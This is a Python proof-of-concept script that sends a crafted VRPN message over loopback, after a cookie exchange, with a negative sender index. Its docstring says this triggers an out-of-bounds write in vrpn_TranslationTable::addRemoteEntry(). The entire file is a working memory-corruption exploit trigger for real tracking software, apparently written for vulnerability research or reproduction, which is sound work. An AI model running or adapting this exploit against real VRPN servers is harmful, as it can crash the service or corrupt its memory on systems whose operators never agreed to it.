#!/usr/bin/env python3
"""VRPN TCP client: cookie exchange, then one description message whose
20-byte header sender field (header[3]) is attacker-chosen.

Exercises vrpn_TranslationTable::addRemoteEntry(): the wire sender is used as
a signed index into d_entry[] with only an upper-bound check. The NUL index
(`--index`) stays in bounds so this isolates the translation-table write.
Loopback only; no external hosts.
"""
import argparse
import socket
import struct
import time

COOKIE_SIZE = 24  # vrpn_MAGICLEN(16) + vrpn_ALIGN(8)
HEADER_LEN = 24   # 5 int32 fields (20) rounded up to vrpn_ALIGN(8)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--sender", type=lambda x: int(x, 0), default=-1,
                    help="wire header[3] value, used as signed remote_id")
    ap.add_argument("--index", type=lambda x: int(x, 0), default=4,
                    help="in-bounds NUL index in the description handler")
    ap.add_argument("--name", default="B" * 96,
                    help="96 description bytes copied verbatim by addRemoteEntry")
    ap.add_argument("--port", type=int, default=15300)
    ap.add_argument("--hold", type=float, default=2.0)
    ap.add_argument("--msgtype", type=lambda x: int(x, 0), default=-1,
                    help="-1 sender description, -2 type description")
    args = ap.parse_args()

    name = args.name.encode()
    payload = struct.pack(">i", args.index) + name
    payload_len = len(payload)
    ceil_len = payload_len + (-payload_len % 8)
    msg = struct.pack(">IIIIII", HEADER_LEN + payload_len, 0, 0,
                      args.sender & 0xFFFFFFFF, args.msgtype & 0xFFFFFFFF, 0)
    msg += payload + b"\0" * (ceil_len - payload_len)

    with socket.create_connection(("127.0.0.1", args.port), timeout=5) as s:
        cookie = s.recv(COOKIE_SIZE)
        if len(cookie) != COOKIE_SIZE:
            raise SystemExit(f"short cookie: {cookie!r}")
        s.sendall(cookie)
        time.sleep(0.2)
        s.sendall(msg)
        time.sleep(args.hold)
        print(f"cookie={cookie!r}")
        print(f"sender={args.sender} index={args.index} msgtype={args.msgtype} "
              f"name={name[:16]!r} name_len={len(name)} "
              f"payload_len={payload_len} msg_len={len(msg)}")


if __name__ == "__main__":
    main()
